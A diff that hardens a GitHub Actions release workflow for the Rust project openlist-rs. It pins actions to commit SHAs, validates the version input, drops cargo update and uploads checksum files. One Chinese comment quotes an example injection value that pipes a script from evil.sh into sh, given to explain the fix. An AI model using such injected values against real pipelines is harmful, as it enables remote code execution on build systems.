@@ -21,20 +21,22 @@ jobs:
     name: build frontend
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v7
+      # 第三方 Action 一律固定 commit SHA：按 tag/branch 引用时上游一次 push 就能
+      # 换掉构建工具链（供应链攻击面）。升级走 Dependabot 的 PR 流程。
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
 
-      - uses: actions/setup-node@v7
+      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
         with:
           node-version: 22
 
       - name: Build frontend
         working-directory: web
         run: |
-          npm install --no-audit --no-fund
+          npm ci --no-audit --no-fund
           npm run build
 
       - name: Upload web/dist
-        uses: actions/upload-artifact@v7
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
         with:
           name: web-dist
           path: web/dist
@@ -71,25 +73,32 @@ jobs:
             artifact: openlist-rs-android-arm64
 
     steps:
-      - uses: actions/checkout@v7
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
 
       # 1. 前端产物（由 frontend job 构建一次，rust-embed 编译期嵌入）
       - name: Download web/dist
-        uses: actions/download-artifact@v8
+        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
         with:
           name: web-dist
           path: web/dist
 
+      # 版本号经 env 传入并做正则白名单：直接内插 ${{ }} 到 run 脚本里，
+      # 恶意输入（如 `1.0.0"; curl evil.sh | sh; "`）可执行任意命令。
       - name: Inject version into Cargo.toml
         shell: bash
+        env:
+          RAW_VERSION: ${{ github.event.inputs.version }}
         run: |
-          VERSION="${{ github.event.inputs.version }}"
-          VERSION="${VERSION#v}"
+          VERSION="${RAW_VERSION#v}"
+          if [[ ! "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
+            echo "非法版本号: $VERSION" >&2
+            exit 1
+          fi
           sed -i.bak "s/^version = .*/version = \"${VERSION}\"/" Cargo.toml
           rm -f Cargo.toml.bak
 
       # 2. Rust 工具链
-      - uses: dtolnay/rust-toolchain@stable
+      - uses: dtolnay/rust-toolchain@39008827e6b4319a349e9a42dfc90579dd25f1ca # stable
         with:
           targets: ${{ matrix.target }}
 
@@ -100,7 +109,7 @@ jobs:
 
       - name: Install Android NDK
         if: contains(matrix.target, 'android')
-        uses: nttld/setup-ndk@v1
+        uses: nttld/setup-ndk@ed92fe6cadad69be94a966a7ee3271275e62f779 # v1.6.0
         id: setup-ndk
         with:
           ndk-version: r27c
@@ -124,11 +133,11 @@ jobs:
           echo "CC_${U}=musl-gcc" >> "$GITHUB_ENV"
           echo "AR_${U}=ar" >> "$GITHUB_ENV"
 
-      - name: Update Cargo.lock
-        run: cargo update
-
+      # 不再执行 cargo update：那会让下面的 --locked 失去意义，发布产物依赖的是
+      # 构建当日的最新版本而非仓库锁定的版本，与 CI 验证对象脱节。
+      # 依赖升级一律走 update.yml 的 PR 流程并经 CI 验证。
       - name: Cache cargo
-        uses: actions/cache@v6
+        uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
         with:
           path: |
             ~/.cargo/registry
@@ -161,20 +170,23 @@ jobs:
           $hash = (Get-FileHash "${{ matrix.artifact }}.zip" -Algorithm SHA256).Hash.ToLower()
           "$hash  ${{ matrix.artifact }}.zip" | Out-File -Encoding ascii "${{ matrix.artifact }}.zip.sha256"
 
+      # 校验和文件必须一起上传，否则用户无从校验（旧版只生成不上传）
       - name: Upload release assets (Unix)
         if: runner.os != 'Windows'
-        uses: softprops/action-gh-release@v3
+        uses: softprops/action-gh-release@8a0cd651e5b2365bd640854a3fa5dfc70e4875f3 # v3.0.4
         with:
           tag_name: ${{ github.event.inputs.version }}
           name: openlist-rs ${{ github.event.inputs.version }}
           files: |
             ${{ matrix.artifact }}.tar.gz
+            ${{ matrix.artifact }}.tar.gz.sha256
 
       - name: Upload release assets (Windows)
         if: runner.os == 'Windows'
-        uses: softprops/action-gh-release@v3
+        uses: softprops/action-gh-release@8a0cd651e5b2365bd640854a3fa5dfc70e4875f3 # v3.0.4
         with:
           tag_name: ${{ github.event.inputs.version }}
           name: openlist-rs ${{ github.event.inputs.version }}
           files: |
             ${{ matrix.artifact }}.zip
+            ${{ matrix.artifact }}.zip.sha256
